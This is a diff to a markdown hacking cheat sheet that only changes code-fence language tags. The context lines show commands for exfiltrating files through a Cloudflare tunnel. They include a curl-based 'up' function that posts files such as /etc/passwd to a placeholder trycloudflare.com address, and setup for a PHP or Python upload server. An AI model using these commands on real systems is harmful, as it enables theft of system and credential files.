@@ -1082,7 +1082,7 @@ Receiver: Access the URL from any browser to view/download the remote file syste
 #### 1 - Upload using PHP:
 
 On the Receiver:
-```
+```posh
 curl -fsSL -o upload_server.php https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/upload_server.php
 mkdir upload
 (cd upload; php -S 127.0.0.1:8080 ../upload_server.php &>/dev/null &)
@@ -1090,7 +1090,7 @@ cloudflared tunnel --url localhost:8080 --no-autoupdate
 ```
 
 On the Sender:
-```
+```posh
 # Set a function:
 up() { curl -fsSL -F "file=@${1:?}" https://ABOVE-URL-HERE.trycloudflare.com; }
 # upload files like so:
@@ -1101,14 +1101,14 @@ up /etc/passwd
 #### 2 - Upload using PYTHON:
 
 On the Receiver:
-```
+```posh
 pip install uploadserver
 python -m uploadserver &
 cloudflared tunnel -url localhost:8000
 ```
 
 On the Sender:
-```sh
+```posh
 curl -X POST  https://CF-URL-CHANGE-ME.trycloudflare.com/upload -F 'files=@myfile.txt'
 ```
 
